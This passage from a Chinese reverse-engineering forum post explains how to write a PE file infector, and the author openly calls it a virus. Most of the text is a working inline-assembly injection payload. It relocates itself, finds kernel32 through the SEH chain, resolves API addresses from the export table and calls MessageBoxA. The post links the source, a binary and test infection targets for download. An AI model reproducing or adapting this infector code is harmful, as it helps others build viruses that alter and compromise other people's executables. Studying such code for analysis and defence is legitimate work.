
![](https://bbs.kanxue.com/upload/attach/201012/246960_g22v6db9zg632oi.jpg)

![](https://bbs.kanxue.com/upload/attach/201012/246960_7bcsag7k9gkfn9p.jpg)

最后看下注入代码的编写吧。因为注入代码运行时已经在目标程序中，所以要自己获取需要调用的函数地址。具体见代码吧：

```
void _declspec(naked)MainCode()

{



_asm

	{

        _Start:

			call _Reloc

		_Reloc:

			pop eax

			sub eax,5

			mov ebx,eax

			sub eax,offset _Start



			mov ebp,esp

			sub esp,0x50

			mov [ebp-4],eax

			mov [ebp-0x28],ebx

			

			mov eax,fs:[0]

		_SearchFunc:

			cmp eax,0

			jz _Over

			mov ebx,[eax]

			cmp ebx,-1

			jz _FoundFunc

			mov eax,ebx

			jmp _SearchFunc

		_FoundFunc:

			mov eax,[eax+4]

		_SearchMZ:

			cmp eax,0

			jz _Over

			xor ax,ax

			cmp word ptr[eax],'ZM'

		    jz _SearchPE

			dec eax

			jmp _SearchMZ

			

		_SearchPE:

			mov ebx,[eax+0x3c]

			add ebx,eax

			cmp word ptr[ebx],'EP'

		    jz _FoundModule

			dec eax

			jmp _SearchMZ

			

		_FoundModule:

			mov [ebp-8],eax



			mov ebx,[ebx+0x78]

			lea esi,[ebx+eax+0x10]

			lodsd

			xchg eax,ebx //base index

			lodsd

			lodsd

			xchg eax,ecx //name count

			lodsd

			xchg eax,edx //func address

			lodsd

			xchg eax,edi //name address

			lodsd		//oridinal index

			

			mov [ebp-0xc],ebx

			mov [ebp-0x10],ecx

			mov [ebp-0x14],edx

			mov [ebp-0x18],edi

			mov [ebp-0x1c],eax



			//第一分段

			push eax  //50

			push eax  

			push eax

			pop eax   //58

			pop eax

			pop eax

			

			push 0x0fffffff9

			lea eax,[esp]

			call _Addr1

        _Addr1:

			pop ebx

			//mov eax,0xf9ffffff

			//mov edi,ebx

        _SearchContent:

			mov ecx,4

			mov esi,eax

			mov edi,ebx

			repz cmpsb

			jz _SearchContentOver

			inc ebx

			jmp _SearchContent

        _SearchContentOver:

			mov [ebp-0x2c],edi

			pop eax



			push 0x0fffffffa

			lea eax,[esp]

			call _Addr2

        _Addr2:

			pop ebx

        _SearchTitle:

			mov ecx,4

			mov esi,eax

			mov edi,ebx

			repz cmpsb

			jz _SearchTitleOver

			inc ebx

			jmp _SearchTitle

		_SearchTitleOver:

			mov [ebp-0x30],edi

			pop eax



			push 0x0fffffffb

			lea eax,[esp]

			call _Addr3

        _Addr3:

			pop ebx

        _SearchLoadLibraryA:

			mov ecx,4

			mov esi,eax

			mov edi,ebx

			repz cmpsb

			jz _SearchLoadLibraryAOver

			inc ebx

			jmp _SearchLoadLibraryA

		_SearchLoadLibraryAOver:

			mov [ebp-0x34],edi

			pop eax



			push 0x0fffffffc

			lea eax,[esp]

			call _Addr4

        _Addr4:

			pop ebx

		_SearchGetFuncAddress:

			mov ecx,4

			mov esi,eax

			mov edi,ebx

			repz cmpsb

			jz _SearchGetFuncAddressOver

			inc ebx

			jmp _SearchGetFuncAddress

		_SearchGetFuncAddressOver:

			mov [ebp-0x38],edi

			pop eax



			push 0x0fffffffd

			lea eax,[esp]

			call _Addr5

        _Addr5:

			pop ebx

		_SearchUser32:

			mov ecx,4

			mov esi,eax

			mov edi,ebx

			repz cmpsb

			jz _SearchUser32Over

			inc ebx

			jmp _SearchUser32

		_SearchUser32Over:

			mov [ebp-0x3c],edi

			pop eax



			push 0x0fffffffe

			lea eax,[esp]

			call _Addr6

        _Addr6:

			pop ebx

		_SearchMessageBoxA:

			mov ecx,4

			mov esi,eax

			mov edi,ebx

			repz cmpsb

			jz _SearchMessageBoxAOver

			inc ebx

			jmp _SearchMessageBoxA

		_SearchMessageBoxAOver:

			mov [ebp-0x40],edi

			pop eax



			push 0x0ffffffff

			lea eax,[esp]

			call _Addr7

        _Addr7:

			pop ebx

		_SearchExitProcess:

			mov ecx,4

			mov esi,eax

			mov edi,ebx

			repz cmpsb

			jz _ExitProcessOver

			inc ebx

			jmp _SearchExitProcess

		_ExitProcessOver:

			mov [ebp-0x44],edi

			pop eax



			//第二分段

			push eax

			push eax

			push eax

			pop eax

			pop eax

			pop eax



			mov eax,[ebp-4]

			mov ebx,[ebp-0x34]

			lea edi,[ebx]

			mov edx,edi

			xor eax,eax

		_Scasb:

			scasb

			jnz _Scasb

			dec edi

			sub edi,edx

			mov ebx,edi

            

			mov ecx,[ebp-0x10]

		_LoadLA:

			mov eax,[ebp-0x18]

			add eax,[ebp-0x8]

			mov eax,[eax+ecx*4-4]

			add eax,[ebp-0x8]

			lea edi,[eax]

			mov esi,edx

			push ecx

			mov ecx,ebx

			repz cmpsb

			jz _F

			pop ecx

			loop _LoadLA



		_F:

			pop ecx

			mov eax,[ebp-0x1c]

			add eax,[ebp-0x8]

			movzx ebx,word ptr[eax+ecx*2-2]

			mov eax,[ebp-0x14]

			add eax,[ebp-0x8]

			mov eax,[eax+ebx*4]

			add eax,[ebp-0x8]

			mov [ebp-0x20],eax



			mov eax,[ebp-0x4]

			mov ebx,[ebp-0x38]

			lea edi,[ebx]

			mov ebx,edi

			xor eax,eax

		_Sca:

			scasb

			jnz _Sca

			dec edi

			sub edi,ebx

			mov edx,edi



			mov ecx,[ebp-0x10]

		_GetFuncAddress:

			mov eax,[ebp-0x18]

			add eax,[ebp-0x8]

			mov eax,[eax+ecx*4-4]

			add eax,[ebp-0x8]

			lea esi,[eax]

			mov edi,ebx

			push ecx

			mov ecx,edx

			repz cmpsb

			jz _FoundGetFuncAddress

			pop ecx

			loop _GetFuncAddress



		_FoundGetFuncAddress:

			pop ecx

			mov eax,[ebp-0x1c]

			add eax,[ebp-0x8]

			movzx ebx,word ptr[eax+ecx*2-2]

			mov eax,[ebp-0x14]

			add eax,[ebp-0x8]

			mov eax,[eax+ebx*4]

			add eax,[ebp-0x8]

			mov [ebp-0x24],eax



			mov eax,[ebp-4]

			mov ebx,[ebp-0x44]

			lea edi,[ebx]

			mov ebx,edi

			xor eax,eax

		_ScaExitProcess:

			scasb

			jnz _ScaExitProcess

			dec edi

			sub edi,ebx

			mov edx,edi

			

			mov ecx,[ebp-0x10]

		_GetExitProcess:

			mov eax,[ebp-0x18]

			add eax,[ebp-0x8]

			mov eax,[eax+ecx*4-4]

			add eax,[ebp-0x8]

			lea esi,[eax]

			mov edi,ebx

			push ecx

			mov ecx,edx

			repz cmpsb

			jz _FoundExitProcess

			pop ecx

			loop _GetExitProcess

			

		_FoundExitProcess:

			pop ecx

			mov eax,[ebp-0x1c]

			add eax,[ebp-0x8]

			movzx ebx,word ptr[eax+ecx*2-2]

			mov eax,[ebp-0x14]

			add eax,[ebp-0x8]

			mov eax,[eax+ebx*4]

			add eax,[ebp-0x8]

			mov [ebp-0x28],eax



			//第三分段

			push eax

			push eax

			push eax

			pop eax

			pop eax

			pop eax



			mov eax,[ebp-0x20]

			mov ebx,[ebp-0x4]

			mov edx,[ebp-0x3c]

			//lea edx,[edx]

			push edx

			call eax

			cmp eax,-1

			jz _Over

			mov edx,[ebp-0x40]

		   // mov edx,[edx]

			push edx

			push eax

			mov eax,[ebp-0x24]

			call eax

			cmp eax,-1

			jz _Over

			mov ebx,[ebp-0x4]

			push 4

			mov edx,[ebp-0x30]

			push edx

			mov edx,[ebp-0x2c]

			push edx

			push 0

			call eax

			cmp eax,6  //IDOK=6,IDNO=7

			jnz _Over

		    _emit 0x90

		    _emit 0x90

		    _emit 0x90

		    _emit 0x90

		    _emit 0x90

		    _emit 0x90

		_Over:

			mov esp,ebp

			ret		



	}

}





void _declspec(naked) GetEndAddress()

{

	_asm ret;

}
```

用内联汇编写病毒，还是不爽。asm才是病毒的王道。

以上代码写的有点混乱，重复代码也比较多，凑活看吧。差点忘了，软件运行界面

![](https://bbs.kanxue.com/upload/attach/201012/246960_7ss8525j4zurztt.jpg)

最后附上源码+bin+测试用的感染目标

[PE感染.rar](https://bbs.kanxue.com/attach-download-52618.htm)

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

上传的附件：

- [TM截图未命名.jpg](javascript:void(0);)（55.63kb，1563次下载）
- [TM截图未命名5.jpg](javascript:void(0);)（74.27kb，1547次下载）
- [TM截图未命名3.jpg](javascript:void(0);)（58.07kb，1550次下载）
- [TM截图未命名4.jpg](javascript:void(0);)（99.93kb，1549次下载）
- [未命名6.jpg](javascript:void(0);)（23.56kb，1548次下载）
- [TM截图未命名7.jpg](javascript:void(0);)（54.40kb，1530次下载）
- [TM截图未命名8.jpg](javascript:void(0);)（94.21kb，1530次下载）
- [TM截图未命名10.jpg](javascript:void(0);)（67.74kb，1522次下载）
- [TM截图未命名11.jpg](javascript:void(0);)（52.71kb，1513次下载）
- [TM截图未命名12.jpg](javascript:void(0);)（112.66kb，1522次下载）
- [TM截图未命名13.jpg](javascript:void(0);)（82.09kb，1513次下载）
- [TM截图未命名14.jpg](javascript:void(0);)（26.42kb，1508次下载）
- [PE感染.rar](javascript:void(0);)（211.25kb，871次下载）
